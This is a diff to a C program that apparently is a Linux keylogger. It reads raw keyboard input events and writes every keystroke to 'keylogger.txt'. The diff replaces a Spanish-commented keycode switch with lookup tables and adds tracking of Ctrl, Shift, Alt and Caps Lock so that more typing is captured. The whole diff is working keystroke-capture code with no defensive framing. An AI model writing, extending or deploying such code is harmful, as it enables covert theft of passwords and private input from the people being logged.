@@ -8,8 +8,29 @@
 
 #define LOGFILEPATH "keylogger.txt"
 
+char keymap[58] = {
+    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '?',0, '\b', 0, 'q',
+    'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[',
+    ']', '\n', 0, 'a', 's', 'd', 'f', 'g', 'h', 'j',
+    'k', 'l', 'n', '{', 0, 0, '}', 'z', 'x', 'c',
+    'v', 'b', 'n', 'm', 0, 0, 0, 0, 0, 0, ' '
+};
+
+char block_keymap[58] = {
+    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '?',0, '\b', 0, 'Q',
+    'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[',
+    ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J',
+    'K', 'L', 'N', '{', 0, 0, '}', 'Z', 'X', 'C',
+    'V', 'B', 'N', 'M', 0, 0, 0, 0, 0, 0, ' '
+};
+
+int ctrl_pressed = 0;
+int shift_pressed = 0;
+int alt_pressed = 0;
+int caps_lock_on = 0;
+
 char *getEvent();
-char keycode_to_char(int keycode);
+char keycode_to_char(int keycode, int is_up);
 
 int main() {
     struct input_event ev;
@@ -39,13 +60,40 @@ int main() {
             exit(1);
         }
 
-        if (ev.type == EV_KEY && ev.value == 1) { // Solo teclas presionadas
-            char ch = keycode_to_char(ev.code);
-            if (ch != 0) { // Ignorar códigos de teclas no mapeadas
-                fprintf(fp, "%c", ch);
-                fflush(fp);
+        if (ev.type == EV_KEY) {
+            if (ev.value == 1) {
+                if (ev.code == 29 || ev.code == 97) {
+                    ctrl_pressed = 1;
+                } else if (ev.code == 42 || ev.code == 54) {
+                    shift_pressed = 1;
+                } else if (ev.code == 56) {
+                    alt_pressed = 1;
+                }else if (ev.code == 58) {
+                    caps_lock_on = !caps_lock_on;
+                } else {
+                    char ch = keycode_to_char(ev.code, shift_pressed);
+                    if (ch != 0) {
+                        if (ctrl_pressed) {
+                            fprintf(fp, "Ctrl+%c\n", ch);
+                        }else if (shift_pressed) {
+                            fprintf(fp, "Shift+%c\n", ch);
+                        }else if (alt_pressed) {
+                            fprintf(fp, "Alt+%c\n", ch);
+                        }
+                        else {
+                            fprintf(fp, "%c", ch);
+                        }
+                    }
+                }
+            } else if (ev.value == 0) {
+                if (ev.code == 29 || ev.code == 97) {
+                    ctrl_pressed = 0;
+                } else if (ev.code == 42 || ev.code == 54) {
+                    shift_pressed = 0;
+                }
             }
         }
+        fflush(fp);
     }
 
     fclose(fp);
@@ -66,71 +114,13 @@ char *getEvent() {
     return event;
 }
 
-char keycode_to_char(int keycode) {
-    // Mapeo básico de códigos de teclas a caracteres en español
-    switch (keycode) {
-        // Letras minúsculas
-        case 30: return 'a';  // 'a'
-        case 31: return 's';  // 's'
-        case 32: return 'd';  // 'd'
-        case 33: return 'f';  // 'f'
-        case 34: return 'g';  // 'g'
-        case 35: return 'h';  // 'h'
-        case 36: return 'j';  // 'j'
-        case 37: return 'k';  // 'k'
-        case 38: return 'l';  // 'l'
-        case 39: return ';';  // ';'
-        case 44: return 'z';  // 'z'
-        case 45: return 'x';  // 'x'
-        case 46: return 'c';  // 'c'
-        case 47: return 'v';  // 'v'
-        case 48: return 'b';  // 'b'
-        case 49: return 'n';  // 'n'
-        case 50: return 'm';  // 'm'
-        case 51: return ',';  // ','
-        case 52: return '.';  // '.'
-        case 53: return '/';  // '/'
-
-        // Letras mayúsculas
-        case 16: return 'A';  // 'A'
-        case 17: return 'S';  // 'S'
-        case 18: return 'D';  // 'D'
-        case 19: return 'F';  // 'F'
-        case 20: return 'G';  // 'G'
-        case 21: return 'H';  // 'H'
-        case 22: return 'J';  // 'J'
-        case 23: return 'K';  // 'K'
-        case 24: return 'L';  // 'L'
-        case 25: return ':';  // ':'
-        case 26: return 'Z';  // 'Z'
-        case 27: return 'X';  // 'X'
-        case 29: return 'V';  // 'V'
-
-        // Caracteres especiales comunes
-        case 2: return '1';  // '1'
-        case 3: return '2';  // '2'
-        case 4: return '3';  // '3'
-        case 5: return '4';  // '4'
-        case 6: return '5';  // '5'
-        case 7: return '6';  // '6'
-        case 8: return '7';  // '7'
-        case 9: return '8';  // '8'
-        case 10: return '9'; // '9'
-        case 11: return '0'; // '0'
-        case 12: return '!'; // '!'
-        case 13: return '@'; // '@'
-        case 14: return '#'; // '#'
-        case 15: return '$'; // '$'
-
-        // Espacio
-        case 57: return ' ';
-
-        // Enter
-        case 28: return '\n';
-
-        case 58: return ':';  // : en teclado numérico
-
-        // Teclas no mapeadas explícitamente
-        default: return 0;
+char keycode_to_char(int keycode, int is_up) {
+    if (keycode >= 0 && keycode < sizeof(keymap)) {
+        char ch = is_up ? block_keymap[keycode] : keymap[keycode];
+        if (caps_lock_on && ch >= 'a' && ch <= 'z') {
+            return ch - 'a' + 'A';
+        }
+        return ch;
     }
+    return 0;
 }
